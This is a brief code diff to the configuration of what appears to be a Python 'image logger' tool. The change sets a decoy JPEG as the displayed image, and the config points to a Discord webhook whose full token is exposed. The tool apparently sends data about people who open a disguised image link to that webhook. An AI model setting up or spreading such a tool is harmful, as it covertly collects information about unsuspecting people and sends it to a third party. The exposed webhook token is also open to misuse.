@@ -13,7 +13,7 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1340084984882401391/ZgMwrjhlkSkZv6_yMycf-zrmlU9OGSrTyjq6kYhx_SG-NH_vm3GMRMTLn5v4EnP9yHbp",
-    "image": "", # You can also have a custom image by using a URL argument
+    "image": "https://academy-cdn.wedio.com/2022/06/jpeg-format.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
